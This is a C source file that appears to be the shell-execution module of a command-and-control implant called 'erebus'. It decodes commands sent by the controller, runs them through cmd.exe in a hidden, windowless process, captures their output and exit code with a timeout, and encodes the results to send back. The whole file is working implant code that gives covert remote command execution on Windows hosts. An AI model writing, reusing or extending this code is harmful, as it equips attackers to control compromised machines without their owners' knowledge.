#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "erebus/pb_c2.h"

#define MAX_CAPTURE 65536
#define SHELL_TIMEOUT_MS 120000

static int run_cmd(const char *command, char **stdout_out, char **stderr_out, int32_t *exit_code) {
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE rd_out = NULL, wr_out = NULL, rd_err = NULL, wr_err = NULL;
    CreatePipe(&rd_out, &wr_out, &sa, 0);
    CreatePipe(&rd_err, &wr_err, &sa, 0);
    SetHandleInformation(rd_out, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(rd_err, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = wr_out;
    si.hStdError = wr_err;
    si.wShowWindow = SW_HIDE;

    char cmdline[8192];
    snprintf(cmdline, sizeof(cmdline), "cmd.exe /C %s", command);

    PROCESS_INFORMATION pi;
    memset(&pi, 0, sizeof(pi));
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(rd_out); CloseHandle(wr_out); CloseHandle(rd_err); CloseHandle(wr_err);
        return 0;
    }
    CloseHandle(wr_out);
    CloseHandle(wr_err);

    char *out_buf = (char *)calloc(1, MAX_CAPTURE);
    char *err_buf = (char *)calloc(1, MAX_CAPTURE);
    if (!out_buf || !err_buf) {
        free(out_buf); free(err_buf);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(rd_out); CloseHandle(rd_err);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        return 0;
    }
    size_t out_len = 0, err_len = 0;
    char tmp[4096];
    DWORD n = 0;
    int timed_out = 0;
    DWORD start = GetTickCount();

    for (;;) {
        /* Drain available pipe data so child cannot block on full pipe. */
        DWORD avail = 0;
        while (PeekNamedPipe(rd_out, NULL, 0, NULL, &avail, NULL) && avail > 0) {
            DWORD to_read = avail > sizeof(tmp) ? (DWORD)sizeof(tmp) : avail;
            if (!ReadFile(rd_out, tmp, to_read, &n, NULL) || n == 0) break;
            if (out_len + n < MAX_CAPTURE - 1) {
                memcpy(out_buf + out_len, tmp, n);
                out_len += n;
            }
        }
        avail = 0;
        while (PeekNamedPipe(rd_err, NULL, 0, NULL, &avail, NULL) && avail > 0) {
            DWORD to_read = avail > sizeof(tmp) ? (DWORD)sizeof(tmp) : avail;
            if (!ReadFile(rd_err, tmp, to_read, &n, NULL) || n == 0) break;
            if (err_len + n < MAX_CAPTURE - 1) {
                memcpy(err_buf + err_len, tmp, n);
                err_len += n;
            }
        }

        DWORD wait = WaitForSingleObject(pi.hProcess, 100);
        if (wait == WAIT_OBJECT_0) break;

        if (GetTickCount() - start >= SHELL_TIMEOUT_MS) {
            timed_out = 1;
            TerminateProcess(pi.hProcess, 1);
            WaitForSingleObject(pi.hProcess, 5000);
            break;
        }
    }

    /* Final drain after exit */
    while (ReadFile(rd_out, tmp, sizeof(tmp), &n, NULL) && n > 0) {
        if (out_len + n < MAX_CAPTURE - 1) {
            memcpy(out_buf + out_len, tmp, n);
            out_len += n;
        }
    }
    while (ReadFile(rd_err, tmp, sizeof(tmp), &n, NULL) && n > 0) {
        if (err_len + n < MAX_CAPTURE - 1) {
            memcpy(err_buf + err_len, tmp, n);
            err_len += n;
        }
    }

    DWORD code = 1;
    GetExitCodeProcess(pi.hProcess, &code);
    if (timed_out) {
        const char *msg = "\r\n[erebus] shell timeout (120s), process killed\r\n";
        size_t mlen = strlen(msg);
        if (err_len + mlen < MAX_CAPTURE - 1) {
            memcpy(err_buf + err_len, msg, mlen);
            err_len += mlen;
        }
        code = 124;
    }

    CloseHandle(rd_out);
    CloseHandle(rd_err);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    *stdout_out = out_buf;
    *stderr_out = err_buf;
    *exit_code = (int32_t)code;
    return 1;
}

int erebus_task_shell_execute(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
    erebus_shell_task st;
    if (!erebus_pb_decode_shell_task(data, data_len, &st)) return 0;
    char *so = NULL, *se = NULL;
    int32_t code = 1;
    if (!run_cmd(st.command, &so, &se, &code)) return 0;
    int ok = erebus_pb_encode_shell_result(so, se, code, out, out_len);
    free(so);
    free(se);
    return ok;
}
